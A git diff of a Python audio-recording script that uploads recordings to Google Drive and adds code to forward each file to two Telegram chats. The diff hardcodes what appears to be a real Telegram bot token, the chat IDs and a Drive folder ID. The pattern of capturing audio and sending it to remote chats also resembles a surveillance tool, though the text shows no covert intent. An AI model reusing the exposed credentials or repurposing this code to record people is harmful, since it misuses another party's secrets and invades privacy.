@@ -7,7 +7,7 @@ from threading import Thread
 from datetime import datetime
 import pyaudio
 from googleDrive import authenticate_google_drive, upload_to_google_drive
-
+from telegramSend import send_to_telegram
 def record(filename):
     # Load configuration from JSON
     def load_config():
@@ -83,12 +83,24 @@ def record(filename):
                     frames.clear()
 
     def process_uploads(service):
+        bot_token = '7759050359:AAF4tx3FUZWpBkkyuIK_miihDtzfP39WoCM'
+        chat_id = ['6088271522','5491210881']
         while True:
             file_path = upload_queue.get()
             if file_path is None:
                 break
+            # Upload the file to Google Drive
             upload_to_google_drive(file_path, '1eEMhEHFETEi8uQec5OhrmWdF-RZfxUAy', service)
-            time.sleep(1)
+            print(f"File uploaded to Google Drive: {file_path}")
+            
+            # Wait 5 seconds before sending the Telegram message
+            time.sleep(5)
+
+            # Send the message to Telegram
+            send_to_telegram(file_path, bot_token, chat_id)
+            
+            time.sleep(1)  # Optional: To prevent overwhelming the server
+
 
     drive_service = authenticate_google_drive()
 
